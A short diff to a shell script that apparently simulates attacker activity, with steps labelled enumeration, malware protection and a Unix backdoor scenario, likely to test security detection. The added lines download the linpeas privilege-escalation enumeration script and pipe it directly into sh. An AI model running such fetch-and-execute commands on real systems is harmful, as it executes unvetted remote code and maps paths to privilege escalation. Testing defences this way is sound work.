@@ -19,6 +19,10 @@ echo "[+] Executing enumeration script."
 sh enum_script.sh
 sleep 3
 
+# Step 3 More Smart Enumerations 
+echo "[+] Download linpeas for fun"
+wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
 # SENARIO 2 --- Local Malware 
 echo "Senario 2 - Malware Protection"
 # Step 1 - Unix Backdoor Senario 
